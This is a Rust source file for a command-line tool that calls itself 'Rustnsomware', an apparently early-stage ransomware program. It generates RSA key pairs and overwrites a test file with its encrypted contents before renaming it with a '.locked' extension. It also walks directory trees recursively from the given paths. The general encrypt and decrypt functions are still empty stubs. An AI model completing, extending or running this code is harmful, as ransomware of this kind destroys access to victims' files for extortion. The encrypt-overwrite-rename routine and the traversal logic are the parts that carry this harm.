use clap::Parser;
use filenamify::filenamify;
use rand;
use rsa::pkcs1::{EncodeRsaPrivateKey, EncodeRsaPublicKey};
use rsa::pkcs8::LineEnding;
use rsa::{pkcs8::DecodePublicKey, Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
use std::collections::LinkedList;
use std::fs::{self};
use std::io::{Read, Write};
use std::{env, io};

/// > Rustnsomware: encrypt and decrypt filesystem
#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[arg(long)]
    private_key: Option<String>,

    #[arg(long)]
    public_key: Option<String>,

    #[arg(short, long, value_enum)]
    command: Option<RustnsomwareCommand>,

    #[arg(short, long)]
    verbose: bool,

    #[clap(value_parser, num_args = 1.., value_delimiter = ' ')]
    paths: Vec<String>,
}

#[derive(clap::ValueEnum, Clone, Debug)]
enum RustnsomwareCommand {
    GenerateKeys,
    Encrypt,
    Decrypt,
}

fn get_file_as_byte_vec(filename: &String) -> Vec<u8> {
    dbg!(filename);
    let mut f = fs::OpenOptions::new()
        .create(true)
        .read(true)
        .write(true)
        .open(&filename)
        .unwrap();
    // let mut f = fs::File::open(&filename).expect("no file found");
    let metadata = fs::metadata(&filename).expect("unable to read metadata");
    let mut buffer = vec![0; metadata.len() as usize];
    f.read(&mut buffer).expect("buffer overflow");

    buffer
}

fn generate_keys() {
    println!("generating keys");
    let mut rng = rand::thread_rng();
    let bits = 2048;
    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let pub_key = RsaPublicKey::from(&priv_key);

    fs::create_dir_all("keys").expect("ERR");
    let mut key_name = Default::default();
    print!("Input key name: ");
    io::stdout().flush().expect("msg");
    io::stdin().read_line(&mut key_name).expect("ERR");
    let priv_key_filename = filenamify(key_name[..key_name.len() - 1].to_owned() + ".pem");

    priv_key
        .write_pkcs1_pem_file(
            String::from("keys/".to_owned() + &priv_key_filename),
            LineEnding::default(),
        )
        .expect("ERR");

    let pub_key_filename = filenamify(key_name[..key_name.len() - 1].to_owned() + ".pem.pub");
    pub_key
        .write_pkcs1_pem_file(
            String::from("keys/".to_owned() + &pub_key_filename),
            LineEnding::default(),
        )
        .expect("ERR");

    println!("keys generated");
}

fn encrypt_files() {}
fn decrypt_files() {}

fn execute_command(command: RustnsomwareCommand) {
    match command {
        RustnsomwareCommand::GenerateKeys => generate_keys(),
        RustnsomwareCommand::Encrypt => encrypt_files(),
        RustnsomwareCommand::Decrypt => decrypt_files(),
    }
}

fn main() {
    let args = Args::parse();
    // let _p = args.public_key.clone();
    let mut files: LinkedList<String> = LinkedList::new();

    let program_name = env::current_exe().expect("WTF??");
    dbg!(program_name);
    dbg!(args.public_key);
    dbg!(args.private_key);

    match args.command {
        None => {
            println!("No command provided, exiting");
            std::process::exit(1);
        }
        Some(command) => execute_command(command),
    }

    /*
    let mut rng = rand::thread_rng();
    // let bits = 2048;
    let public_key = RsaPublicKey::from_public_key_pem(&p).expect("failure");
    */
    let mut rng = rand::thread_rng();
    let bits = 2048;
    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let pub_key = RsaPublicKey::from(&priv_key);

    let data = get_file_as_byte_vec(&String::from("test/foo.txt"));

    let enc_data = pub_key
        .encrypt(&mut rng, Pkcs1v15Encrypt, &data)
        .expect("failed to encrypt")
        .to_vec();

    // dbg!(&enc_data);

    // dbg!(str::from_utf8(&enc_data).unwrap()); //.expect("msg")); // enc_data);

    let mut file = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open("test/foo.txt")
        .unwrap();

    file.write_all(&enc_data).expect("AA");
    fs::rename("test/foo.txt", "test/foo.txt.locked").expect("CCC");

    let file_data = get_file_as_byte_vec(&String::from("test/foo.txt.locked"));
    assert!(enc_data == file_data);

    let dec_data = priv_key
        .decrypt(Pkcs1v15Encrypt, &enc_data)
        .expect("failed to decrypt");
    let s = String::from_utf8(dec_data.clone()).expect("Our bytes should be valid utf8");
    dbg!(s);

    /*
        let mut file = fs::OpenOptions::new()
        .create(true)
        .write(true)
        .truncate(true)
        .open("test/foo.txt")
        .unwrap();

    file.write_all(&dec_data).expect("BB");
    */

    /*
    if args.key.is_some() {
        println!("{}", args.key.unwrap());
    }
    */

    args.paths.iter().for_each(|file| {
        files.push_back(String::from(file));
    });

    while !files.is_empty() {
        let current_file = files.pop_front().expect("This should not happen");
        let metadata = fs::metadata(current_file.clone()).unwrap();

        /* TODO: skip if executable name is equal to current file
        if current_file == program_name.file_name().expect("WTF") {
            continue;
        }
        */

        if args.verbose {
            print!("Processing {}", current_file)
        }

        if metadata.is_dir() {
            fs::read_dir(current_file).unwrap().for_each(|f| {
                files.push_back(String::from(
                    f.unwrap().path().canonicalize().unwrap().to_string_lossy(),
                ));
            });
        } else if metadata.is_file() {
            println!("{}", current_file);
        }
    }

    std::process::exit(0);
}
